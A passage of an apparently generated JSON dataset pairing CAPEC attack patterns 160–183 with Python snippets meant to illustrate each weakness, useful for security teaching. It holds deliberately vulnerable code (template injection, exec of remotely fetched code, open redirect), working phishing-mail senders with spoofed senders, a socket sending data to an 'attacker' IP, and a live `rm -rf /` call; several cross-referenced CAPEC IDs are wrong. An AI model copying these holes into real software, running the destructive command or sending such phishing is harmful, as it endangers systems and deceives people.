        "code_snippet": "import os\nimport ctypes\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n\n# Simulate user input for library path\nuser_supplied_path = '/tmp/malicious_lib.so'\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\n# Vulnerable code: loading a library from a user-supplied path\ntry:\n    # This will load the library from the user-supplied path\n    malicious_lib = ctypes.CDLL(user_supplied_path)\n    print('Library loaded successfully')\n    # Call a function from the malicious library\n    malicious_lib.malicious_function()\nexcept OSError as e:\n    print(f'Error loading library: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where an application loads an external library from a user-supplied path. The code uses the `ctypes` module to load a shared library (`.so` file) from a path provided by the user. This embodies the main idea of the CAPEC 'Redirect Access to Libraries' by allowing an adversary to supply a malicious library, which the application then loads and executes. The related CWEs are represented as follows: CWE-426 and CWE-427 highlight the untrusted and uncontrolled search path elements, CWE-73 shows the external control of the file path, CWE-706 indicates the use of an incorrectly-resolved name or reference, and CWE-1265 is implied by the potential for unintended reentrant invocation if the malicious library's functions are called inappropriately."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    # Vulnerable to script injection\n    return render_template_string('<html><body><script>{{ script }}</script></body></html>', script=script)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to script injection attacks. The '/execute' endpoint accepts a POST request containing a 'script' parameter. The script is then directly embedded into an HTML template using Flask's render_template_string function without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks, where an attacker can inject malicious scripts. The code embodies the main idea of the CAPEC 'Exploit Script-Based APIs' by showing how an attacker can exploit a web application's ability to execute scripts provided by the user. The related CWEs are represented by the lack of input validation and improper neutralization of user input, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef vulnerable_connect(server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # CWE-941: Incorrectly specified destination\n        # Connect to an attacker-controlled server instead of the intended server\n        attacker_ip = '192.168.1.100'  # Attacker's IP\n        s.connect((attacker_ip, server_port))\n        \n        # CWE-924: No integrity check on the message\n        message = 'Sensitive data'\n        s.sendall(message.encode('utf-8'))\n        \n        # CWE-497: Exposure of sensitive system information\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n        \n    except Exception as e:\n        print('Connection failed:', e)\n    finally:\n        s.close()\n\n# Example usage\nvulnerable_connect('192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates a vulnerable network connection that embodies the main idea of the CAPEC 'Infrastructure Manipulation'. The function `vulnerable_connect` is intended to connect to a server and send sensitive data. However, it contains several vulnerabilities:\n\n1. **CWE-923**: The communication channel is not properly restricted to the intended endpoint. The code connects to an attacker-controlled IP address instead of the legitimate server IP.\n2. **CWE-941**: The destination for the communication channel is incorrectly specified, leading to the connection to an attacker's server.\n3. **CWE-924**: There is no integrity check on the message being sent, making it susceptible to tampering during transmission.\n4. **CWE-497**: Sensitive system information (the response from the server) is exposed to an unauthorized control sphere (the attacker's server).\n\nThis code represents the concept of infrastructure manipulation where an attacker redirects network messages to their own server to capture sensitive information, demonstrating how improper handling of communication channels can lead to significant security risks."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['GET', 'POST'])\ndef purchase():\n    if request.method == 'POST':\n        # Vulnerable: Trusting client-side hidden field for price\n        item_price = float(request.form['price'])\n        quantity = int(request.form['quantity'])\n        total_cost = item_price * quantity\n        return f'Total cost: ${total_cost}'\n    else:\n        # Example item with hidden price field\n        return render_template_string('''\n            <form method=\"post\">\n                <input type=\"hidden\" name=\"price\" value=\"100.00\">\n                Quantity: <input type=\"number\" name=\"quantity\" value=\"1\">\n                <input type=\"submit\" value=\"Purchase\">\n            </form>\n        ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a purchase endpoint that processes a form submission. The form includes a hidden field for the item price, which is trusted by the server when calculating the total cost. An attacker can manipulate the hidden price field in the form to alter the total cost calculation, exploiting the server's reliance on client-side data. This embodies the CAPEC 'Manipulating Hidden Fields' and related CWEs, such as CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-472 (External Control of Assumed-Immutable Web Parameter)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# User-specific information for spear phishing\nuser_email = 'target_user@example.com'\nuser_name = 'Target User'\ntrusted_sender_email = 'trusted_sender@example.com'\n\n# Crafting the spear phishing email\nmsg = MIMEMultipart()\nmsg['From'] = trusted_sender_email\nmsg['To'] = user_email\nmsg['Subject'] = 'Important Update for ' + user_name\n\n# Email body with a malicious link\nbody = f\"\"\"\nHi {user_name},\n\nWe have an important update for you. Please visit the following link to review the details:\n\n<a href='http://malicious-site.com'>http://trusted-site.com</a>\n\nBest regards,\nTrusted Sender\n\"\"\"\nmsg.attach(MIMEText(body, 'html'))\n\n# Sending the email\ntry:\n    server = smtplib.SMTP('smtp.example.com', 587)\n    server.starttls()\n    server.login('trusted_sender@example.com', 'password')\n    server.sendmail(trusted_sender_email, user_email, msg.as_string())\n    server.quit()\n    print('Spear phishing email sent successfully.')\nexcept Exception as e:\n    print(f'Failed to send email: {e}')",
        "description": "This Python code snippet demonstrates a spear phishing attack by sending a targeted email to a specific user. The email appears to come from a trusted sender and contains a personalized message with a malicious link disguised as a trusted link. The code uses the smtplib library to send the email and MIMEText to format the email content. This example embodies the main idea of CAPEC-163 (Spear Phishing) by targeting a specific user with a tailored phishing email. The related CWEs are represented by the use of a misleading URL (CWE-601) and the potential for UI misrepresentation (CWE-451)."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-451: UI Misrepresentation of Critical Information\nphishing_message = \"Your account has been compromised. Please visit http://fakebank.com to secure your account.\"\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_sender = \"security@realbank.com\"\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\n\n# Function to send phishing SMS via email-to-SMS gateway\ndef send_phishing_sms(phone_number):\n    msg = MIMEText(phishing_message)\n    msg['From'] = spoofed_sender\n    msg['To'] = f\"{phone_number}@sms.gateway.com\"\n    msg['Subject'] = \"Urgent: Account Security Alert\"\n\n    try:\n        with smtplib.SMTP('smtp.fakebank.com') as server:\n            server.sendmail(spoofed_sender, [msg['To']], msg.as_string())\n        print(f\"Phishing SMS sent to {phone_number}\")\n    except Exception as e:\n        print(f\"Failed to send phishing SMS: {e}\")\n\n# Example usage\nsend_phishing_sms(\"1234567890\")",
        "description": "This Python code snippet demonstrates a mobile phishing attack by sending a phishing SMS message via an email-to-SMS gateway. The message misrepresents critical information (CWE-451) by spoofing the sender's email address (CWE-290) to appear as a legitimate source. The phishing message contains a link to a fake website designed to steal sensitive information. The code highlights the risks associated with improper authentication mechanisms (CWE-307, CWE-309, CWE-308) by showing how easily users can be tricked into providing their credentials. This example is for educational purposes to illustrate the vulnerabilities and should not be used maliciously."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-22: Path Traversal\n    if not file_path.startswith('/safe/directory/'): \n        raise ValueError('Invalid file path')\n\n    # CWE-73: External Control of File Name or Path\n    with open(file_path, 'r') as file:\n        data = file.read()\n\n    # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    if file_path.endswith('.txt'):\n        process_as_text(data)\n    elif file_path.endswith('.jpg'):\n        process_as_image(data)\n    else:\n        raise ValueError('Unsupported file type')\n\n    # CWE-377: Insecure Temporary File\n    temp_file_path = '/tmp/tempfile'\n    with open(temp_file_path, 'w') as temp_file:\n        temp_file.write(data)\n\n    # CWE-99: Improper Control of Resource Identifiers\n    os.system(f'cat {temp_file_path}')\n\n\ndef process_as_text(data):\n    print('Processing text file')\n\n\ndef process_as_image(data):\n    print('Processing image file')\n\n# Example usage\nuser_input_path = input('Enter the file path: ')\nprocess_file(user_input_path)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to file manipulation as described in the CAPEC. The `process_file` function takes a file path as input and performs various operations on the file. The code includes the following vulnerabilities:\n\n1. CWE-22 (Path Traversal): The code checks if the file path starts with a safe directory but does not properly neutralize special elements, potentially allowing path traversal attacks.\n2. CWE-73 (External Control of File Name or Path): The file path is controlled by user input, which can lead to unauthorized file access.\n3. CWE-646 (Reliance on File Name or Extension of Externally-Supplied File): The code relies on the file extension to determine how to process the file, which can be exploited by an attacker to misclassify the file.\n4. CWE-377 (Insecure Temporary File): The code creates a temporary file in a predictable location, which can be exploited by an attacker to manipulate the file.\n5. CWE-99 (Improper Control of Resource Identifiers): The code uses the `os.system` function to execute a command with the temporary file path, which can be exploited for command injection.\n\nOverall, this code snippet embodies the main idea of the CAPEC by demonstrating how improper handling of file paths and file contents can lead to various security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "class SystemConfig:\n    def __init__(self):\n        self.config = {'setting1': 'default1', 'setting2': 'default2'}\n        self.authenticated = False\n\n    def reset_config(self):\n        if not self.authenticated:\n            self.config = {'setting1': 'default1', 'setting2': 'default2'}\n            print('Configuration reset to default values.')\n        else:\n            print('Unauthorized reset attempt.')\n\n    def authenticate(self, password):\n        if password == 'correct_password':\n            self.authenticated = True\n            print('Authenticated successfully.')\n        else:\n            print('Authentication failed.')\n\n# Example usage\nsystem = SystemConfig()\nsystem.reset_config()  # Resets configuration without authentication\nsystem.authenticate('wrong_password')\nsystem.reset_config()  # Still resets configuration without proper authentication",
        "description": "This Python code snippet defines a `SystemConfig` class that simulates a system configuration with a reset function. The `reset_config` method resets the configuration to default values without requiring authentication, embodying CWE-306 (Missing Authentication for Critical Function). The `authenticate` method is provided to simulate an authentication mechanism, but it is not used to protect the reset function, illustrating the vulnerability. This code represents the main idea of CAPEC-272 (Force the System to Reset Values) by allowing an attacker to reset the system configuration to a previous state without proper authentication, potentially exploiting weaknesses in the system's prior state."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import os\nimport logging\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = 'Sensitive Trace Data'\ntrace_file_path = '/tmp/trace_data.txt'\n\n# Storing sensitive trace data in an unprotected location\nwith open(trace_file_path, 'w') as trace_file:\n    trace_file.write(trace_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogging.basicConfig(filename='/tmp/system_info.log', level=logging.DEBUG)\nlogging.debug('System Info: CPU Usage: 85%, Memory Usage: 70%')\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulating activation of debug mode\nDEBUG_MODE = True\nif DEBUG_MODE:\n    print('Debug mode activated. Sensitive data may be exposed.')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Simulating a security check that might be optimized away\ndef security_check():\n    pass  # Security check logic here\n\n# Potentially optimized away by the processor\nsecurity_check()\n\n# CWE-506: Embedded Malicious Code\n# Simulating embedded malicious code\nmalicious_code = lambda: os.system('rm -rf /')\nmalicious_code()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'White Box Reverse Engineering' and its associated CWEs. The code includes:\n\n1. **CWE-1323**: Sensitive trace data is stored in an unprotected location (`/tmp/trace_data.txt`).\n2. **CWE-497**: Sensitive system information is logged to a file (`/tmp/system_info.log`) that could be accessed by unauthorized users.\n3. **CWE-1313**: A debug mode is activated at runtime, potentially exposing sensitive data.\n4. **CWE-1037**: A security check function is defined but contains no logic, simulating a scenario where the processor might optimize away critical security code.\n5. **CWE-506**: Malicious code is embedded and executed, simulating a harmful action (`os.system('rm -rf /')`).\n\nThe code represents the main idea of the CAPEC by showing how an attacker could use white box analysis techniques to discover and exploit these vulnerabilities in the software."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import os\n\n# Create a file with an alternate data stream\nfile_path = 'example.txt'\nads_path = file_path + ':hidden_stream'\n\n# Write data to the main file\nwith open(file_path, 'w') as f:\n    f.write('This is the main file content.')\n\n# Write data to the alternate data stream\nwith open(ads_path, 'w') as f:\n    f.write('This is hidden content in ADS.')\n\n# Read data from the main file\nwith open(file_path, 'r') as f:\n    print('Main file content:', f.read())\n\n# Read data from the alternate data stream\nwith open(ads_path, 'r') as f:\n    print('ADS content:', f.read())",
        "description": "This Python code snippet demonstrates the creation and usage of an Alternate Data Stream (ADS) in a Windows NTFS file system. The main file 'example.txt' is created and written with some content. An ADS named 'hidden_stream' is then created and written with different content. The code reads and prints the content from both the main file and the ADS. This example embodies the CAPEC concept of using ADS to hide data, which can be exploited by attackers to store malicious tools or sensitive information without detection by standard file utilities. The related CWEs highlight potential security weaknesses such as improper handling of ADS, improper removal of sensitive information, and insecure operations on file paths."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import socket\n\n# Vulnerable code that exposes sensitive information\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # Truncating security-relevant information\n        truncated_data = data[:10]\n        print(f'Received data: {truncated_data}')\n        # Observable behavioral discrepancy\n        if b'secret' in data:\n            client_socket.send(b'Access Denied')\n        else:\n            client_socket.send(b'Hello, World!')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a simple server that listens for incoming connections and processes data from clients. The code embodies the main idea of the CAPEC 'Footprinting' by exposing sensitive information (CWE-200) through the print statement that logs client connections. It also truncates security-relevant information (CWE-222) by only printing the first 10 bytes of received data. Additionally, the server exhibits observable behavioral discrepancies (CWE-205) by responding differently based on the presence of the word 'secret' in the received data, which can be used by an attacker to infer the internal state or decision process of the server."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'http://example.com/login?username=admin&password=secret'\nresponse = requests.get(url)\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\nif response.status_code != 200:\n    print(f'Error: {response.status_code} - {response.text}')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nserver_info = response.headers.get('Server')\nif server_info:\n    print(f'Server Information: {server_info}')\n\n# CWE-1125: Excessive Attack Surface\n# Probing different endpoints to gather information\nendpoints = ['/admin', '/config', '/debug', '/backup']\nfor endpoint in endpoints:\n    probe_url = f'http://example.com{endpoint}'\n    probe_response = requests.get(probe_url)\n    print(f'Probed {endpoint}: {probe_response.status_code}')",
        "description": "This Python code snippet demonstrates the concept of web application fingerprinting by sending HTTP GET requests to a web application and analyzing the responses. The code includes several vulnerabilities: \n1. CWE-598: Sensitive information (username and password) is included in the query string of a GET request.\n2. CWE-209: Error messages containing potentially sensitive information are printed if the response status code is not 200.\n3. CWE-497: The server's response headers are checked for sensitive system information, such as server version.\n4. CWE-1125: The code probes multiple endpoints to gather information about the web application's structure and potential vulnerabilities. This information can be used to formulate targeted attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input('Enter variable name: ')\n\n# CWE-627: Dynamic Variable Evaluation\nexec(f'{user_input} = 42')\n\n# CWE-95: Eval Injection\nexec(f'print({user_input})')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to dynamically create and manipulate a variable name using the 'exec' function. This is an example of CWE-627 (Dynamic Variable Evaluation) and CWE-95 (Eval Injection). The 'exec' function evaluates the user input as code, which can lead to arbitrary code execution if the input is not properly sanitized. This represents the main idea of the CAPEC by showing how user-controlled variables can be manipulated to execute unintended actions."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import tkinter as tk\nfrom tkinter import messagebox\n\n# Function to simulate a malicious action\ndef malicious_action():\n    messagebox.showinfo(\"Download\", \"Downloading malicious software...\")\n    # Here, you would add the code to download and execute malicious software\n\n# Function to simulate a benign action\ndef benign_action():\n    messagebox.showinfo(\"Query\", \"Submitting your query...\")\n    # Here, you would add the code to submit a query\n\n# Create the main application window\nroot = tk.Tk()\nroot.title(\"Action Spoofing Example\")\n\n# Create a button that appears to submit a query but actually downloads software\nbutton = tk.Button(root, text=\"Submit Query\", command=malicious_action)\nbutton.pack(pady=20)\n\n# Start the Tkinter event loop\nroot.mainloop()",
        "description": "This Python code snippet demonstrates a simple example of action spoofing using the Tkinter library for creating a graphical user interface (GUI). The code creates a window with a button labeled 'Submit Query'. When the user clicks this button, they expect to submit a query, but instead, the button triggers a function that simulates downloading malicious software. This embodies the main idea of CAPEC-139 (Action Spoofing), where an adversary tricks the user into performing an unintended action. The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by misleading the user with the button's label."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET'])\ndef flash_injection():\n    flash_param = request.args.get('flash_param', '')\n    # CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    template = f\"<embed src='movie.swf' FlashVars='{flash_param}'></embed>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Flash Parameter Injection. The application takes a user-supplied parameter 'flash_param' from the URL query string and directly embeds it into an HTML template without proper validation or neutralization. This can allow an attacker to inject malicious global parameters into the Flash file. The code also highlights CWE-1336, where special elements in the template engine are not properly neutralized, leading to potential security risks."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import requests\n\ndef execute_remote_code(url):\n    try:\n        # Fetch the remote code\n        response = requests.get(url)\n        response.raise_for_status()\n        # Execute the fetched code\n        exec(response.text)\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n# Example usage\nexecute_remote_code('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a vulnerable pattern where code is fetched from a remote URL and executed using the `exec` function. The `execute_remote_code` function takes a URL as input, retrieves the code from that URL, and executes it. This embodies the main idea of the CAPEC 'Code Inclusion' by showing how an adversary could exploit a weakness to force arbitrary code to be retrieved and executed. The related CWEs are represented as follows: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is shown by fetching and executing code from an external source; CWE-506 (Embedded Malicious Code) is implied by the potential for the fetched code to be malicious; CWE-94 (Code Injection) is represented by the use of `exec` to execute potentially harmful code; CWE-98 (PHP Remote File Inclusion) is conceptually similar but in a Python context; and CWE-913 (Improper Control of Dynamically-Managed Code Resources) is demonstrated by the lack of restrictions on the fetched code."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# Vulnerable configuration file path\nconfig_file_path = '/etc/myapp/config.ini'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to write configuration\ndef write_config(file_path, data):\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate an attacker modifying the configuration file\nattacker_data = '[Settings]\\nDebugMode=True\\n'\nwrite_config(config_file_path, attacker_data)\n\n# Application reads the modified configuration\nconfig_data = read_config(config_file_path)\nprint('Configuration Data:', config_data)\n\n# Application behavior changes based on the modified configuration\nif 'DebugMode=True' in config_data:\n    print('Debug mode enabled, sensitive operations exposed!')",
        "description": "This Python code snippet demonstrates a configuration/environment manipulation attack. The code simulates an attacker modifying an external configuration file used by an application. The attacker writes a new configuration that enables a debug mode, which could expose sensitive operations. The application then reads the modified configuration and changes its behavior based on the new settings. This example embodies the main idea of CAPEC-15 (Configuration/Environment Manipulation) and highlights CWE-15 (External Control of System or Configuration Setting) by showing how an attacker can externally control and manipulate configuration settings to affect the application's behavior."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\n# Simulate a protected directory and file\nprotected_dir = '/protected'\nprotected_file = 'config.cfg'\n\n# Simulate an attacker creating a file with the same name in a different directory\nattacker_dir = '/tmp'\nattacker_file_path = os.path.join(attacker_dir, protected_file)\n\n# Create the attacker's file\nwith open(attacker_file_path, 'w') as f:\n    f.write('malicious content')\n\n# Vulnerable function that loads the configuration file\n# It searches the attacker's directory before the protected directory\nsearch_paths = [attacker_dir, protected_dir]\n\nfor path in search_paths:\n    file_path = os.path.join(path, protected_file)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            config_content = f.read()\n        break\n\nprint(f'Loaded config content: {config_content}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can create a file with the same name as a protected file in a different directory. The vulnerable function searches directories in a specific order and loads the first file it finds with the matching name. In this case, the attacker's file in '/tmp' is loaded before the legitimate file in '/protected'. This represents the CAPEC idea of exploiting file location algorithms by creating files with the same name as protected files. The related CWEs provide additional context, such as reliance on file names and paths, and the potential for external control over these elements."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, request, redirect, make_response\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n@app.route('/flash')\ndef flash_vulnerable():\n    flash_url = request.args.get('flash_url')\n    if flash_url:\n        response = make_response(f'<object type=\"application/x-shockwave-flash\" data=\"{flash_url}\"></object>')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No Flash URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a web application with two endpoints: '/redirect' and '/flash'. The '/redirect' endpoint demonstrates an open redirect vulnerability (CWE-601) by accepting a user-controlled 'url' parameter and redirecting the user to that URL without validation. The '/flash' endpoint demonstrates a Cross-Site Flashing vulnerability by accepting a user-controlled 'flash_url' parameter and embedding it in an HTML object tag, which can load and execute a Flash file from an external URL. This can be exploited if the Flash file contains malicious instructions. The code highlights the risks of allowing user-controlled input to dictate URLs and the embedding of external content without proper validation."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "from flask import Flask, request, jsonify, make_response\nimport json\n\napp = Flask(__name__)\n\n# Simulated micro-service endpoint\n@app.route('/api/userinfo', methods=['GET'])\ndef user_info():\n    # CWE-598: Sensitive information in query string\n    user_id = request.args.get('user_id')\n    if not user_id:\n        return make_response(jsonify({'error': 'User ID is required'}), 400)\n\n    # Simulated sensitive data\n    user_data = {\n        '1': {'name': 'John Doe', 'email': 'john.doe@example.com'},\n        '2': {'name': 'Jane Smith', 'email': 'jane.smith@example.com'}\n    }\n\n    # CWE-602: Client-side enforcement of server-side security\n    if user_id not in user_data:\n        return make_response(jsonify({'error': 'Unauthorized access'}), 403)\n\n    return jsonify(user_data[user_id])\n\n# CWE-539: Persistent cookies with sensitive information\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    username = data.get('username')\n    password = data.get('password')\n\n    # Simulated authentication\n    if username == 'admin' and password == 'password':\n        resp = make_response(jsonify({'message': 'Login successful'}))\n        resp.set_cookie('session_id', '123456789', max_age=60*60*24*30)  # Persistent cookie\n        return resp\n    else:\n        return make_response(jsonify({'error': 'Invalid credentials'}), 401)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses Flask to create a simple web application with two endpoints: '/api/userinfo' and '/login'. The '/api/userinfo' endpoint demonstrates CWE-598 by using the HTTP GET method to process a request that includes sensitive information (user_id) in the query string. It also demonstrates CWE-602 by relying on the client to provide a valid user_id without proper server-side validation. The '/login' endpoint demonstrates CWE-539 by setting a persistent cookie containing sensitive information (session_id) upon successful login. This code embodies the main idea of the CAPEC by exposing micro-services directly and making them vulnerable to exploitation through improper handling of sensitive information and inadequate security measures."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Sensitive file with incorrect permissions\nsensitive_file = '/etc/sensitive_data.txt'\nos.chmod(sensitive_file, 0o777)  # Incorrectly setting permissions to be world-readable and writable\n\n# CWE-1220: Insufficient Granularity of Access Control\n# Function to check access control, but with insufficient granularity\nuser_roles = {'admin': ['read', 'write', 'delete'], 'user': ['read']}\n\n# Function to check access\ndef check_access(user_role, action):\n    if action in user_roles.get(user_role, []):\n        return True\n    return False\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\n# Function to access sensitive data\n\ndef access_sensitive_data(user_role):\n    # Accessing the sensitive data before checking access control\n    with open(sensitive_file, 'r') as file:\n        data = file.read()\n    if check_access(user_role, 'read'):\n        return data\n    else:\n        return 'Access Denied'\n\n# Example usage\nuser_role = 'user'\nprint(access_sensitive_data(user_role))",
        "description": "This Python code snippet demonstrates a scenario where an attacker can exploit incorrectly configured access control security levels. The code includes three main vulnerabilities:\n\n1. **CWE-732: Incorrect Permission Assignment for Critical Resource** - The sensitive file '/etc/sensitive_data.txt' is assigned overly permissive permissions (world-readable and writable), allowing unauthorized access.\n\n2. **CWE-1220: Insufficient Granularity of Access Control** - The access control function `check_access` lacks sufficient granularity, making it too broad and potentially allowing unauthorized actions.\n\n3. **CWE-1280: Access Control Check Implemented After Asset is Accessed** - The function `access_sensitive_data` reads the sensitive data before performing the access control check, allowing unauthorized users to access the data before being denied.\n\nThe code represents the main idea of the CAPEC by showing how incorrect configuration of access controls can lead to unauthorized access to sensitive resources."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <iframe src=\"https://trusted-site.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;\"></iframe>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a clickjacking vulnerability. The main idea of the CAPEC (Flash File Overlay) is represented by embedding an iframe with a transparent overlay (opacity:0) over the entire page. This iframe points to a trusted site, but because it is transparent, user actions such as clicks will be intercepted by the iframe rather than the underlying content. This can lead to unintended actions being performed on the trusted site. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe, CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by potentially allowing cross-domain interactions, and CWE-434 (Unrestricted Upload of File with Dangerous Type) by not validating the content within the iframe."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/load_flash', methods=['GET'])\ndef load_flash():\n    flash_url = request.args.get('flash_url')\n    if not flash_url:\n        return 'No flash URL provided', 400\n    # CWE-20: Improper Input Validation\n    if 'http' not in flash_url:\n        return 'Invalid URL', 400\n    # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n    response = requests.get(flash_url)\n    if response.status_code != 200:\n        return 'Failed to load flash content', 500\n    # CWE-506: Embedded Malicious Code\n    flash_content = response.text\n    return render_template_string(flash_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application that loads and executes Flash content from a user-specified URL. The main idea of the CAPEC (Flash Injection) is demonstrated by allowing an attacker to trick the application into executing malicious Flash content. The code includes several CWE-related weaknesses:\n\n1. CWE-20 (Improper Input Validation): The code does not properly validate the 'flash_url' parameter, only checking for the presence of 'http' in the URL.\n2. CWE-942 (Permissive Cross-domain Policy with Untrusted Domains): The code fetches and executes Flash content from any domain, including potentially untrusted ones.\n3. CWE-506 (Embedded Malicious Code): The code directly renders the fetched Flash content, which could contain malicious code.\n\nThis combination of weaknesses allows an attacker to inject and execute malicious Flash content, demonstrating the Flash Injection attack described in the CAPEC."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
